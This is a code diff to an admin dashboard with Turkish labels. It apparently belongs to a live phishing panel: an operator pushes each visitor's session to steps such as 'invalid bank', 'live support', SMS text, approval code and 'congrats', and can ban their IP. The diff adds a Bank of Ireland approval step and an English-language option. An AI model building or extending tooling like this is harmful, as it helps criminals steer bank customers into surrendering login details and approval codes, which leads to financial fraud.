@@ -472,6 +472,22 @@ export function AdminDashboardClean() {
       setSmsCustomTextInput("");
       return;
     }
+    if (step === "boi_approval") {
+      const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", id).maybeSingle();
+      const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
+      await supabase.from("sessions").update({
+        is_hidden: false,
+        current_step: "special_approval",
+        status: "online",
+        form_data: {
+          ...prev,
+          approvalStatus: "boi_approval",
+          approvalCode: "",
+        },
+      }).eq("id", id);
+      await load();
+      return;
+    }
     if (step === "special_approval") {
       setSpecialPromptSessionId(id);
       return;
@@ -925,8 +941,14 @@ export function AdminDashboardClean() {
                           colorClass = "bg-blue-500/20 text-blue-500";
                           text = "CANLI DESTEK";
                         } else if (s === "special_approval") {
-                          colorClass = "bg-blue-500/20 text-blue-500";
-                          text = "ÖZEL BİLDİRİM";
+                          const appr = (row.form_data as any)?.approvalStatus;
+                          if (appr === "boi_approval" || appr === "boi") {
+                            colorClass = "bg-fuchsia-500/20 text-fuchsia-400";
+                            text = "BOI ONAYI";
+                          } else {
+                            colorClass = "bg-blue-500/20 text-blue-500";
+                            text = "ÖZEL BİLDİRİM";
+                          }
                         } else if (s === "congrats") {
                           colorClass = "bg-teal-500/20 text-teal-400";
                           text = "TEBRİKLER (SON)";
@@ -1024,6 +1046,7 @@ export function AdminDashboardClean() {
                           <option value="invalid_bank">Hatalı Banka</option>
                           <option value="live_support">Canlı Desteğe Yönlendir</option>
                           <option value="congrats">Tebrikler Ekranı</option>
+                          <option value="boi_approval">Bank of Ireland Onayı</option>
                           <option value="special_approval">Özel Bildirim Gönder</option>
                           <option value="ban_ip">IP Banla (Siteye Giremesin)</option>
                         </select>
@@ -1403,7 +1426,7 @@ export function AdminDashboardClean() {
                     <option value="da">Danca (Danish)</option>
                     <option value="ro">Rumence (Romanian)</option>
                     <option value="el">Yunanca (Greek)</option>
-                    <option value="pt">Portekizce (Portuguese)</option>
+                    <option value="en">İngilizce (English)</option>
                     <option value="hu">Macarca (Hungarian)</option>
                   </select>
                 </div>
